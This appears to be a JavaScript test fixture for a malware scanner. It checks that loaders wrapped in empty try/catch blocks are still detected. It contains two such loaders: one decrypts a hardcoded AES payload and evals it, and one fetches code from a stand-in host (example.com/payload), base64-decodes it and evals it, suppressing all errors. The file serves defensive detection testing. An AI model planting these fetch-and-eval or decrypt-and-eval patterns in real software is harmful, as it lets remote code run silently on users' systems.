// EDGE CASE TEST FIXTURE — Try/catch wrapped malicious code
// Entire malicious chain wrapped in try/catch with empty catch blocks
// Should still trigger detection

const crypto = require('crypto');

// Hardcoded key
const secretKey = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
const ivHex = 'BBBBBBBBBBBBBBBB';

// Encrypted payload
const encryptedPayload = '4a6f686e446f65313233343536373839304142434445463031323334353637383930';

try {
    const decipher = crypto.createDecipheriv('aes-256-cbc', secretKey, ivHex);
    let decrypted = decipher.update(encryptedPayload, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    try {
        eval(decrypted);
    } catch (e) {
        // Silently ignore execution errors
    }
} catch (e) {
    // Silently ignore decryption errors
}

// Another pattern with async
async function loadPayload() {
    try {
        const response = await fetch('https://example.com/payload');
        const data = await response.text();
        eval(atob(data));
    } catch (e) {
        // Ignore
    }
}

loadPayload();
